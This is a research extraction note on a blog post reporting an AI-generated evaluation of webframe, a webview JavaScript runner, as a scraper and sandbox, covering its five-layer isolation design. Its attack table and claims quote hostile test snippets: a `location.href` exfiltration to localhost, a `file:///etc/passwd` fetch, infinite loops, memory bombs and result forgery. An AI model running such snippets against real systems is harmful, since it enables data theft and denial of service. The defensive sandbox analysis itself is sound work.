---
source_url: https://simonwillison.net/2026/Oct/26/webframe-evaluation/
source_type: blog-post
title: "webframe: evaluated as a scraper and a sandbox"
author: Simon Willison (publishing a research report authored by Claude Opus 5.5)
date_published: 2026-10-26
date_extracted: 2026-10-29
last_checked: 2026-10-29
status: current
confidence_overall: emerging
issue: "#4402"
---

# webframe: evaluated as a scraper and a sandbox

> A single-prompt Claude Opus 5.5 evaluation of a webview-based JavaScript runner concludes that the runtime "is not a sandbox by itself": isolation must be layered from outside, and a concrete five-layer combination held against 20 hostile snippets.

## Source Context

- **Type**: blog-post (short beat) linking to an AI-generated research report at `simonw/research/webframe-evaluation` (README, `notes.md`, `webframe.diff`, `wfjs/`, `sandbox/`, `probes/`). Most claims below come from the README, which is the richer extraction target; the blog post itself is a summary paragraph plus the prompt.
- **Author credibility**: Simon Willison is a prolific LLM-tooling practitioner and author of `shot-scraper`. The report is explicitly flagged "AI-generated" by its own banner; the evaluation was produced from one prompt, with no human validation of the findings. It is one practitioner's/agent's findings, not a benchmark.
- **Scope**: One tool (tractordev/webframe, commit `03155e2`, Go + glaze/WebKitGTK) on Ubuntu 24.04 with WebKitGTK 2.52 and Xvfb. Covers scraping behavior, sandbox properties, and three prototypes. Does not cover macOS/WebView2 behavior. The scraper-vs-shot-scraper timing benchmark is off-topic for the guide and only noted briefly.

## Extracted Claims

### Claim 1: A runtime that executes untrusted code is not a sandbox by itself; its defaults are unsafe and isolation must come from outside
- **Evidence**: Enumerated stock defaults tested via probe pages: full network (including localhost), persistent storage, renderer sandbox off, no time/memory limits, spoofable results.
- **Confidence**: emerging (single tool, agent-run tests, but each default has a reproducible probe)
- **Quote**: "webframe is not a sandbox by itself."
- **Our assessment**: Generalizable and well-evidenced for this tool. The useful lesson is the framing: a "real JS engine with no `fs`/`process`" is a capability-limiting layer, not an isolation boundary.

### Claim 2: The combination that held against every attack was five layers: empty network namespace, ephemeral profile + bubblewrap, timeout with process-group kill, fresh process per call, and a nonce-tagged result
- **Evidence**: `sandbox/wfsandbox.py` run against `sandbox/attacks.py` (20 hostile snippets; output in `attacks-output.txt`). Each call takes about 450 ms.
- **Confidence**: emerging
- **Quote**: "The combination that held up against every attack I tried was:"
- **Our assessment**: Layered design is the transferable pattern. "Every attack I tried" is bounded by the author's (an LLM's) imagination; the report itself lists missing cgroup limits. Not a security audit.

### Claim 3: A CSP-restricted page alone does not stop navigation-based exfiltration; the network namespace is what closes it
- **Evidence**: Attack table: top-level `location.href = "http://127.0.0.1/…?stolen"` — "request arrived" with CSP page only, "blocked" with `unshare -rn`. fetch/XHR/img/beacon/WebSocket were blocked by CSP alone.
- **Confidence**: emerging
- **Quote**: (no direct quote; see table row in the README: "top-level `location.href = "http://127.0.0.1/…?stolen"` | **request arrived** | blocked")
- **Our assessment**: Concrete, easily-missed gap: application-level policy (CSP) covers subresource fetches but not top-level navigation. Strong argument for network-level egress control (cf. AWF in docs-ghaw-sandbox-reference).

### Claim 4: Bubblewrap on the renderer protects against a compromised renderer, not against network access, because the network process sits outside it
- **Evidence**: Verified that `WebKitWebProcess` runs under `bwrap` with its own net/mount/pid namespaces, `NoNewPrivs=1`, seccomp; but WebKit's NetworkProcess does fetching outside bwrap.
- **Confidence**: emerging
- **Quote**: "**However, the network is not cut off.**"
- **Our assessment**: Illustrates that "sandboxed" labels on a component can mislead about which threat they cover. Worth a caution in threat-model discussion.

### Claim 5: A hostile page sharing a JS world with the harness's hooks can forge results; a random nonce converts spoofing into denial of service
- **Evidence**: Page can overwrite `window.__webframe_eval` or call the `window.__webframe` bridge with a guessable sequential id. Mitigation: nonce-tagged stdout line, Python accepts only the nonce-prefixed line. Hardening via non-writable hooks fixed one spoof but `JSON.stringify` replacement still works; real fix is an isolated script world glaze does not expose.
- **Confidence**: emerging
- **Quote**: "Results from hostile pages can't be trusted"
- **Our assessment**: Good general principle for agent harnesses: never trust output channels that untrusted code can write to; authenticate results out-of-band.

### Claim 6: Timeouts must be enforced externally with process-group kill; in-process limits were unavailable and memory was unbounded until the timeout fired
- **Evidence**: `while(true){}` and memory bomb were "killed by timeout (memory unbounded until then)". `RLIMIT_AS` does not work because WebKit reserves about 75 GB virtual memory; cgroup limits are listed as still needed. SIGTERM exits in ~16 ms even while page is in `while(true){}`.
- **Confidence**: emerging
- **Quote**: "a cgroup memory and CPU limit (`RLIMIT_AS` doesn't work, because WebKit reserves about 75 GB of virtual memory)"
- **Our assessment**: Practical gotcha for anyone wrapping a browser engine as a sandbox.

### Claim 7: Persistent profile state leaks between runs unless ephemeral mode is explicitly enabled
- **Evidence**: Stock tool keeps localStorage/cookies/cache in `~/.local/share/<program>`; ephemeral mode exists in glaze but is not exposed. With `-p`, a value written in one run reads `null` in the next.
- **Confidence**: emerging
- **Quote**: "State carries over between runs"
- **Our assessment**: Supports "fresh process / fresh state per call" as a sandbox default.

### Claim 8: Pages with `script-src 'self'` (no `unsafe-eval`), including GitHub, make every stock webframe evaluation fail
- **Evidence**: hooks.js runs code with page-level `(0, eval)(src)`, rejected with EvalError. Patch re-injects via WebKit's native evaluate (not subject to page CSP).
- **Confidence**: emerging
- **Quote**: "Can't scrape GitHub and many other sites"
- **Our assessment**: Failure mode for scraping/verification tooling that evals inside the page; relevant to agents using page-eval as a browser tool.

### Claim 9: Other stock failure modes: 0×0 viewport, hangs on failed loads and never-settling evals, no HTTP status code
- **Evidence**: Table in README; hidden window never sized so `innerWidth`/`innerHeight` are 0; DNS failure prints `Failed to load …` then waits forever unless `-e`; no eval timeout; WebKit has no `responseStatus` so `--fail` re-fetches with `cache: "force-cache"` (a HEAD-based first attempt gave a false positive).
- **Confidence**: emerging
- **Quote**: "A failed page load can hang forever."
- **Our assessment**: Agent-facing lesson: every browser/tool call an agent makes needs a timeout; silent hangs are worse than errors.

### Claim 10: A `shot-scraper javascript` clone on the patched library ran every documented example unchanged, with comparable speed
- **Evidence**: `wfjs` (~350 lines of Go); timing table (e.g. example.com 1.40/1.19/1.37 s shot-scraper vs 1.17/1.10/1.08 s wfjs); memory ~640 MB vs ~456 MB.
- **Confidence**: emerging
- **Quote**: "**Every example in shot-scraper's `docs/javascript.md` that doesn't depend on a shot-scraper-only flag ran unchanged.**"
- **Our assessment**: Interesting as an agent-driven "re-implement against the docs as spec" result, but the guide-relevant content is thin; verified only by the agent itself.

### Claim 11: The evaluation was produced by Claude Opus 5.5 from a single exploratory prompt
- **Evidence**: The blog post gives the prompt.
- **Confidence**: settled (as a description of method)
- **Quote**: "I had Claude Opus 5.5 put it through its paces and prepare a research report for me."
- **Our assessment**: Exemplifies "evaluate-before-trusting" via agent: build probes, prototypes, patch, attack suite from one prompt. The report's own AI-generated banner is a caution on trusting its completeness.

## Concrete Artifacts

Attribution: README of `simonw/research/webframe-evaluation`.

```python
from wfsandbox import run_js     # WEBFRAME=/path/to/patched/webframe
run_js("[1,2,3].map(x => x * 2)")
# {'ok': True, 'result': [2, 4, 6], 'error': None, 'logs': [], 'ms': 1, 'wall_ms': 430}
```

Per-call command (README prose): each call starts a fresh `unshare -rn webframe -b -p -s -c sandbox.html`; sandbox.html has a strict meta CSP and a locked `__sandbox_run(code, nonce)`; Python returns only the stdout line starting with the random nonce; host `WF_*` env vars are stripped.

Attack results (abridged from README table):

| Attack | CSP page only | + `unshare -rn` |
|---|---|---|
| fetch/XHR/img/beacon/WebSocket, `file:///etc/passwd` | blocked | blocked |
| top-level `location.href` to localhost | request arrived | blocked |
| `while(true){}`, memory bomb | killed by timeout | same |
| forged result via `window.__webframe` | nonce check rejects (DoS, not spoof) | — |
| WebAssembly | works | works |

Remaining gaps listed by the author: cgroup memory/CPU limits, isolated script world, long-lived worker mode (450 ms startup per call).

## Cross-References

- **Corroborates**: `blog-simonwillison-smolmachines-untrusted-sandbox.md` Claim 2 (tested sandbox controls incl. no-network and timeouts) and Claim 5 (resource-limit config with timeout) — same author, same report-by-agent format; both conclude isolation comes from layered external controls. `docs-ghaw-sandbox-reference.md` Claim 2 (network egress control as the default sandbox mechanism) agrees that network-level control is the key layer.
- **Contradicts**: None found. (The nearby note's choice of hardware-VM isolation vs. this note's namespace + bubblewrap is a different point on the strength/cost axis, not a contradiction.)
- **Extends**: `blog-green-sandboxing-rogue-agents.md` Claim 5 (sandboxes cannot perfectly isolate useful agents) with a concrete, tool-level example of residual gaps; `blog-simonwillison-shot-scraper-1-10-release.md` Claim 4 (`shot-scraper javascript` `--width`/`--height`) as the reference behavior the clone targets.
- **Novel**: Navigation-based exfiltration passing a CSP-only policy; nonce-tagged result channel to defeat result forgery; `RLIMIT_AS` unusable with WebKit; bubblewrap-on-renderer not covering the network process.

## Guide Impact

- **Chapter 06**: Add a short example under sandboxing/threat model: "a runtime is not a sandbox" with the five-layer combination and the CSP-vs-navigation gap (Claims 1–3), cited to this note. Evidence grade should stay emerging.
- **Chapter 02**: Optionally cite Claim 5 (authenticate results from untrusted-code channels) and Claim 9 (all tool calls need timeouts) in harness-design guidance.
- **Chapter 03**: Low-priority mention of Claim 11 as an example of single-prompt agent-driven tool evaluation, with the caveat that the report is unvalidated.

## Extraction Notes

- Read the blog post and the full README of the linked report (fetched raw). Did not read `notes.md`, `webframe.diff`, or probe sources; claims about them rely on the README's descriptions.
- Table-cell quotes (Claims 7–9, 5) are verbatim from the README's "Impact" column; the README is LLM-generated, so its statements are the agent's assertions rather than independently verified results.
- The scraper-vs-shot-scraper performance comparison was recorded only briefly, per triage guidance.
